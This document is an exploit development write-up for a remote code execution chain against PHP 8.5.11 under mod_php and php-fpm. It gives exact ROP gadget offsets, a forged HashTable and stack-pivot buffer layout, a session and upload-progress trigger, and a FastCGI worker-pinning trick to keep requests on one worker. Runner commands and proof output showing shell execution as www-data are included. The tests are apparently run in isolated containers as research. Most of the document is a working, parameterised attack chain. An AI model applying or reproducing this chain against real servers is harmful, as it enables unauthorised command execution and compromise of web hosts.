# B2 pivot + popen ROP variant

Status: validated on mod_php 8.5.11 (10 prefork children, 9 pins, stock
KeepAlive and php.ini-production): `uid=33(www-data)`. **Also validated on
php-fpm 8.5.11, no forged `execute_data`, ASLR on, stock `php.ini-production`,
one worker, no gdb: 7/7 runs `uid=33(www-data)`** (`fpm/run_rop_pivot.sh`, see
§"FPM data-only pivot"). **And on a `pm.max_children=4` pool: 6/6 runs
`uid=33(www-data)`, ASLR on, no gdb** (`fpm/run_rop_pivot_multi.sh`, see
§"Multi-worker reliability"). The teardown destroy still can't carry the pivot
(it fires on the progress-clobbered bucket 0); the working trigger is the
upload-progress `zend_hash_update` itself, whose old-value destructor runs on
the clean bucket 0 before the insert overwrites it.

## Why replace the execute_data frame

The `zif_system` B2 needs a forged `zend_execute_data`: `func`, `num_args`, an
arg0 type that also serves as bucket 2's key, a NUL-terminated fake
`zend_string`, and a usable `return_value`. The pivot variant removes all of
those: a stack pivot plus a short ROP chain to `popen`.

## Mechanism (mod_php)

`pDestructor = libphp + 0x64904E` (inside `jump_fcontext`):

```
mov rsp,rdi                 ; stack = bucket 0 value
mov 0x40(rsp),r8            ; jmp target
ldmxcsr (rsp)               ; MXCSR at +0
fldcw 0x4(rsp)              ; x87 CW at +4
r12..rbp = [rsp+0x10..0x38]
rsp += 0x48
jmp *r8
```

Fake HashTable at `S`, `arData = S+0x20`; bucket 0's value is the pivot buffer:

| bucket offset | value |
|---|---|
| `+0x00` | MXCSR `0x1F80`, fldcw `0x037F` |
| `+0x08` | zval type `IS_NULL` (not `IS_UNDEF`) |
| `+0x10` | pivot (also `HT->pDestructor`; the gadget loads it into r12) |
| `+0x18..0x38` | zero |
| `+0x40` | `pop rdi;ret` (`lib+0x197128`) |
| `+0x48` | command pointer |
| `+0x50` | `pop rsi;ret` (`lib+0x195A89`) |
| `+0x58` | `"r"` pointer |
| `+0x60` | `ret` (`lib+0x183016`) |
| `+0x68` | `popen@plt` (`lib+0x18BBC0`) |

The A2 stale session reference is overwritten with a fake reference pointing to
the fake array; `track_init` destroys it, `zend_hash_destroy` calls
`pDestructor(&bucket0.val)`, and the pivot runs.

## Validation (mod_php)

```
STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof
main=0x7a63ada00000 libphp=0x7a63aa400000
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## FPM gadgets (php-fpm 8.5.11, md5 `de9f7bd2799504ff67240075fd4e6a03`)

ELF vaddr offsets (re-derived from the container binary; add the leaked PIE base):

| gadget | offset |
|---|---|
| `jump_fcontext` pivot | `0x6bdd0e` |
| `pop rdi;ret` | `0x20a7e8` |
| `pop rsi;ret` | `0x209149` |
| `ret` (unused, see alignment) | `0x20a7e9` |
| `popen@plt` | `0x202e50` |
| `zif_system` | `0x60e3a0` |

There is no `system@plt` (PHP drives `popen`, not libc `system`), so the chain
must pass a valid `"r"` mode pointer in rsi. Confirmed by search: the binary has
exactly one `mov %rdi,%rsp` (the pivot), and no `mov/lea rsp,[rdi+imm]`, `xchg
reg,rsp`, or `pop rsp` with a usable ret. The pivot is the only stack pivot.

## The teardown-destroy obstacle (why the destroy can't carry the pivot)

The in-band B installs the fake table (`arData = d+0xE80`, `pDestructor`) through
the session decode. The arData-redirect element is a normal session var whose
value is `IS_PTR` → `HT+0x10`. `php_session_normalize_vars()` runs at decode end
and, for that `IS_PTR` bucket, does `ZVAL_UNDEF(zv)` on `zv = HT+0x10`; the type
write lands at `HT+0x18` = **nNumUsed**, zeroing it. So the upload-progress
`zend_hash_update` appends at bucket `[nNumUsed] = bucket 0`, overwriting the
pivot buffer's first bucket (val `+0x00` and type `+0x08`, 16-byte zval). The
teardown destroy then runs with `nNumUsed = 1` and fires `pDestructor(&bucket0.val)`
on that clobbered bucket:

```
PIVOT rdi=d+0xE80  P00=0x7ffff625c230 (progress array)  P08=0x307 (IS_ARRAY)  P40=pop_rdi ...
SIGSEGV at jump_fcontext+8 (ldmxcsr reads the array pointer as MXCSR -> #GP)
```

The `zif_system` frame tolerates this because it reads `num_args`/`arg0` from
buckets 1/2 (`+0x2C`/`+0x50`), which the 16-byte bucket-0 write never touches;
the pivot's `ldmxcsr (%rsp)` at `jump_fcontext+8` reads `[arData+0]` and cannot.
Preserving nNumUsed by reusing the arData key to redirect that element only
moves the failure earlier: the reuse `zend_hash_update` fires the (already
installed) `pDestructor` on the old `IS_PTR`→`HT+0x10` value → `ldmxcsr` of
`HT+0x10` → same #GP.

### Verdict: stays blocked (re-confirmed, fresh evidence)

Forcing the insert path (`fpm/mk_rop_pivot.py --teardown`, which points the
forged progress hash slot at `HT_INVALID_IDX` so `zend_hash_update` inserts
instead of updating and never fires at the update) reaches the teardown
`zend_hash_destroy` and reproduces the #GP. `fpm/probe-rop-teardown.gdb` on
`p2s-fpm-pivot` (gdb, ASLR off) at the destroy:

```
DESTROY HT=d-0x193CF0 arData=d+0xE80 nNumUsed=1 nTableSize=16 pDtor=PIVOT
   b0 val=0x7ffff625c230 type=0x307(IS_ARRAY) h=<progress-key hash>   <- clobbered
PIVOT rdi=d+0xE80 val0=0x7ffff625c230
SIGSEGV jump_fcontext+8 (ldmxcsr of the array pointer)
```

The block is structural, a catch-22 on `nNumUsed` (session HT `+0x18`):

- Redirecting `arData` via the signed-index write necessarily stores an
  `IS_PTR`→`HT+0x10` session var (every decoded var goes through
  `ZVAL_PTR(&rv, current); php_set_session_var()`, `ext/session/session.c:1151`).
  `php_set_session_var` uses `zend_hash_update`, which keeps the string key, so
  `PS_ENCODE_LOOP`'s `key == NULL` skip (integer keys) is unreachable from the
  decode. `php_session_normalize_vars()` therefore always visits that bucket and
  does `ZVAL_UNDEF(HT+0x10)`, landing `IS_UNDEF` at `HT+0x18` = **nNumUsed = 0**.
- With `nNumUsed = 0`, the teardown `zend_hash_destroy` iterates **zero** buckets
  unless something re-raises it. The only post-normalize writer before teardown
  is the upload-progress `zend_hash_update`, and its insert appends at
  `arData[nNumUsed] = bucket 0`, overwriting the pivot buffer with the progress
  array zval (observed above). So any `nNumUsed > 0` at destroy comes *from* the
  write that clobbers bucket 0.

The three escapes all fail on this:

1. **Pivot in a bucket normalize doesn't touch.** Normalize already leaves
   bucket 0 alone (it is `IS_NULL`, not `IS_PTR`); the clobber is the later
   progress insert. Moving the pivot to bucket ≥1 does not help: destroy visits
   only `nNumUsed = 1` bucket (bucket 0) and never reaches it.
2. **Avoid the `IS_PTR` element.** The arData redirect *is* that element and it
   is string-keyed, so normalize cannot be made to skip it; overwriting it with
   a same-key second var either fires `pDestructor` early (that is just the
   working update trigger) or needs `pDestructor` unset at that moment, which
   contradicts it being the pivot at teardown.
3. **Restore nNumUsed.** No write lands between normalize and the teardown
   destroy except the progress insert, which clobbers rather than restores.

The working trigger (§"FPM data-only pivot") sidesteps the whole chain: it makes
the progress key an **update** of bucket 0, so `zend_hash_update` fires the
pivot on the clean old value *before* the clobbering copy, and `nNumUsed` is
irrelevant because the lookup uses the hash slots. Reproduce the blocked route
with `MODE=gdb PROBE=probe-rop-teardown.gdb TEARDOWN=1 bash fpm/run_rop_pivot.sh`.

## FPM data-only pivot (working)

Don't use the teardown destroy. The upload-progress handler runs
`zend_hash_update(session_array, "upload_progress_<name>", &data)`, which for an
**existing** key calls `ht->pDestructor(&old->val)` *before* copying the new
value in. Forge that key at bucket 0 so its old value is the pivot buffer: the
update fires the pivot on a clean bucket 0, and the clobbering copy never runs
(the pivot does not return). nNumUsed is irrelevant (the lookup uses the hash
slots), so normalize zeroing it no longer matters.

Forged lookup for `upload_progress_x` (default prefix + the 1-byte progress
field) → bucket 0:

- `bucket0.h = DJBX33A("upload_progress_x") = 0xb3f1b35d4d1a35d5`, placed at
  `d+0xE90` (gadget's r12 slot, don't-care).
- `bucket0.key` → fill-resident `zend_string` (`len = 17`, bytes
  `"upload_progress_x"`); only `len`/val are read by the key compare. Placed at
  `d+0x200`, pointer in `d+0xE98` (r13 slot, don't-care).
- `arHash[(h | nTableMask) as int32] = 0`. `nTableMask = -16` (nTableSize 16),
  so the index is `-11` and the slot is `arData-0x2C = d+0xE54`.

Pivot buffer at bucket 0 (`d+0xE80`, 16-aligned):

| offset | value |
|---|---|
| `+0x00` | MXCSR `0x1F80` / fldcw `0x037F` (`0x0000037F00001F80`) |
| `+0x08` | zval type `IS_NULL` |
| `+0x10` | bucket0.h = key hash (r12) |
| `+0x18` | bucket0.key ptr (r13) |
| `+0x20..0x38` | r14/r15/rbx/rbp = 0 |
| `+0x40` | `pop rdi;ret` (gadget's `jmp *r8` target) |
| `+0x48` | command pointer (`d+0x100`) |
| `+0x50` | `pop rsi;ret` |
| `+0x58` | `"r"` pointer (`d+0x180`) |
| `+0x60` | `popen@plt` |

**Stack alignment:** `popen@plt` sits at `+0x60`, not `+0x68`. After the pivot's
`lea 0x48(%rsp),%rsp`, the chain enters `popen` with `rsp % 16 == 8` only when
the final slot is `+0x60`; a spare `ret` at `+0x68` shifts it to `0` and faults
`_IO_proc_open` on a `movaps`.

Command string at `d+0x100` (low byte `0x00`), `"r"` at `d+0x180`. The session
is unchanged from the `zif_system` nogdb chain except `p8` installs the pivot
gadget as `pDestructor` instead of `zif_system`:
`p1..p5` E0 prelude, `p6` arData=`d+0xE80`, `p7` nTableSize=16, `p8`
pDestructor=`base+0x6bdd0e`.

### Reproduction

```
cd ~/php2shell
bash fpm/run_rop_pivot.sh                 # MODE=nogdb (default), ASLR on
MODE=gdb PROBE=probe-rop-native.gdb bash fpm/run_rop_pivot.sh   # traced
```

Isolated stack: FPM `p2s-fpm-pivot` (port 9101) + nginx `p2s-nginx-pivot`
(9102) on network `p2s-pivot-net`, single worker. Leak/calibration are the
Round 37 values (`PRE=24576`, `DRIFT=0x37000`, `d = heap+0x15cbd8+DRIFT`,
`base = pie-0x7c9777`). Proof `/tmp/fpm_rop_proof`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reliability: 7/7 nogdb runs (ASLR on, stock `php.ini-production`). The worker
SIGSEGVs after the command (the pivot never returns); FPM respawns it.

## Multi-worker reliability

Validated against a `pm.max_children=4` static pool: **6/6 runs
`uid=33(www-data)`, ASLR on, stock `php.ini-production`, no gdb**
(`fpm/run_rop_pivot_multi.sh`, pool `p2s-fpm-pivot4`:9111 + `p2s-nginx-pivot4`:9112).

**Affinity (the only multi-worker-specific problem, and it is solved).** The
chain needs the groom A and the exploit B on the *same* worker (A's bailout
leaves the dangling `d` that B reuses). `fpm/pin_fcgi.py` pins `PINS=3` of the 4
workers on incomplete FastCGI POST bodies (declared `CONTENT_LENGTH` far larger
than the bytes sent, so the worker blocks in the body read and the socket stays
open until killed). Exactly one worker is then free; every request, A through
nginx and B direct to FastCGI, lands on it. Verified in the pool's
`access.log` (`zz-multi.conf` logs the container-namespace worker PID via `%p`):
A, B and any status probe show the same PID.

**The chain is single-shot per worker, so the runner recreates the pool per
run.** This is not a multi-worker limitation; the single-worker
`run_rop_pivot.sh` recreates its container every invocation for the same reason.
The groom/reclaim alignment only holds on a worker's *first* groom: observed on
a fresh pool worker, the leak lands on attempt 1 and every later groom+leak on
that same worker misses (the reclaiming chunk no longer aligns once the heap is
churned). A successful exploit then SIGSEGVs the worker, and the respawned
worker is **not** leak-fresh (tested: 0/3 when looping on one pool). So looping
`RUNS` on a single pool is self-defeating; `run_rop_pivot_multi.sh` makes a fresh
pool each run and drives one chain against the fresh free worker.

Two settings are load-bearing and differ from an earlier broken version of the
script:

- `PRE=24576` (the single-worker value), not 25500. The groom allocation size
  fixes where `d` lands; 25500 misaligns the reclaim.
- Pin with `STATUS_CHECK=0`. A single `/status` request served by the free
  worker before the first groom perturbs its heap enough to break the
  first-groom reclaim (observed: `v5len=4088`, no OOB). The runner pins without a
  status probe and uses a fixed settle delay.

```
cd ~/php2shell
RUNS=6 bash fpm/run_rop_pivot_multi.sh
# [run N] OK (leak try 1) d=... base=... -> uid=33(www-data) ...
# [result] 6/6 proof hits (PINS=3/4 workers, PRE=24576, fresh pool per run)
```

## Tools

- `fpm/run_rop_pivot.sh`: the isolated single-worker FPM data-only pivot chain.
  `TEARDOWN=1` builds the insert-path fill for the teardown-route observation.
- `fpm/run_rop_pivot_multi.sh`: the `pm.max_children=4` variant; pins 3 of 4
  workers via `fpm/pin_fcgi.py`, recreates the pool per run, reports N/M.
- `fpm/pin_fcgi.py`: pins N workers on incomplete FastCGI POST bodies for
  same-worker affinity.
- `fpm/mk_rop_pivot.py`: overlays the pivot buffer + forged progress-key lookup
  onto the Round 37 `--nogdb` fill (`mk_native_fill.py --nogdb`). `--teardown`
  makes the progress lookup miss (insert, not update) to force the teardown path.
- `fpm/probe-rop-native.gdb`: PIVOT + `popen@plt` trace.
- `fpm/probe-rop-teardown.gdb`: logs the teardown `zend_hash_destroy` (nNumUsed,
  arData, buckets) and the pivot fire; used to re-confirm the teardown block.
- `fpm/probe-rop-diag.gdb`, `fpm/probe-rop-hash.gdb`: nNumUsed / bucket / key-hash
  diagnostics used to pin the obstacle.
- `off_chain/stage3_rop.php`: mod_php B2 variant (`STAGE3=stage3_rop.php`).
- `fpm/mk_rop_fill.py`, `fpm/probe-rop.gdb`: superseded pre-Round-37 FPM ROP
  artifacts (direct session-HT redirect; blocked by the bucket-0 clobber).

## Caveats

Offsets are for these builds (php:8.5.11-apache libphp and the php-fpm binary);
a real target needs the leaked bases and same-worker affinity (a single worker,
or spray/pin as in `FPM_RCE.md` §8). The forged progress-key hash
(`0xb3f1b35d4d1a35d5`) and slot index (`-11`) are specific to the key
`upload_progress_x` and `nTableSize = 16`; a different progress field value or
table size shifts both.
